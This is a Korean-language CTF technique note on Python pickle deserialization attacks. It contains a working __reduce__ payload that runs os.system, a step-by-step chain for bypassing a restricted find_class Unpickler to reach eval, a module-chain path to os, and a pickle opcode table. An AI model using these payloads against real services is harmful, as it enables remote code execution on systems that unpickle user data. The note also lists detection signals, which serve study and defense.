# Python Pickle Deserialization Exploits

## 개요
Python pickle은 임의 객체를 직렬화/역직렬화하는 모듈.
`pickle.loads()`는 `__reduce__` 메서드를 통해 임의 코드 실행 가능.

## 기본 RCE 페이로드
```python
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
# pickle.loads(payload) → os.system('id') 실행
```

## Custom Unpickler 우회 (GoN 2022 Trino: Pieces 패턴)

### 제한된 Unpickler
```python
class Unpickler(pickle.Unpickler):
    def find_class(self, module, name):
        assert module == 'picklable'  # picklable 모듈만 허용
        return getattr(__import__('picklable'), name)
```

### 우회 체인
1. **`__dict__` 접근**: `picklable.picklable`을 `picklable.__dict__`로 덮어쓰기
2. **`__import__` 하이재킹**: `__import__`를 `__getattribute__`로 교체
3. **`__builtins__` 로드**: `picklable.__dict__.update(__builtins__)`
4. **`eval` 획득**: builtins에서 eval 가져오기
5. **RCE**: `eval(cmd)` 실행

### 모듈 체인 접근
이미 import된 모듈을 따라가서 os 접근:
```python
picklable.requester.whatwg_url.six.sys.modules["os"]
```

### Pickle opcode 활용
```python
# 주요 opcode
GLOBAL  = b'c'    # find_class(module, name) 호출
INST    = b'i'    # 인스턴스 생성
REDUCE  = b'R'    # callable(*args) 실행
BUILD   = b'b'    # obj.__setstate__(state) 호출
SETITEM = b's'    # dict.__setitem__ 호출
```

## 탐지 시그널
- Flask/Django 세션이 pickle 기반 (Memcached, Redis 백엔드)
- `pickle.loads()` 또는 `pickle.Unpickler` 사용
- 사용자 제어 데이터가 역직렬화됨
- Custom Unpickler의 `find_class` 제한 → 우회 가능성

## 우회 전략 순서
1. 허용된 모듈의 `__dict__`, `__builtins__` 접근
2. 허용된 모듈에서 import된 하위 모듈 체인 탐색
3. `__setattr__`/`__getattribute__` 조합으로 임의 속성 접근
4. `BUILD` opcode로 `__setstate__` 트리거
5. Balsn CTF 2019 pyshv2 패턴: FakeMod 구조 생성

## 참고
- GoN 2022 H. Trino: Pieces
- Balsn CTF 2019 pyshv2
- https://hackmd.io/@Xion/goq_22s_authors_writeup
